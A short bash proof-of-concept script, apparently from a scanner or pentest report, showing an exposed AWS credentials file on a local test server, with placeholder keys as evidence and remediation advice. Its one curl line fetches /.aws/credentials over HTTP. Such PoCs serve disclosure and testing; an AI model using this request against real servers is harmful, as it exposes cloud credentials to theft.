#!/bin/bash
# PoC: AWS Credentials File Exposed (MISCONF-AWS-CREDS)  CVSS 9.8
# Target: 127.0.0.1
# Verified evidence: HTTP 200 — AWS credentials file — body: "[default]\naws_access_key_id = AKIAEXAMPLE\naws_secret_access_key = s3cr3t"
# Remediation: Revoke the keys, remove the file, and use instance roles.
set -u
curl -s -D- "http://127.0.0.1:18080/.aws/credentials" | head -c 2000
